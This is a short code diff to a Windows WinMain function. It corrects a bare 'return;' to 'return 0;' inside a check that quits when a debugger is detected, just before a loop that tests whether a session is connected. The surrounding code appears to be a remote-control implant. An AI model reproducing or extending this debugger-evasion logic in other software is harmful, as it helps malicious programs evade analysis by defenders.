@@ -17,7 +17,7 @@ INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLin
 
     do {
         if(IsDebugged()){
-            return;
+            return 0;
         }
 
         if (!Instance.Session.Connected) {
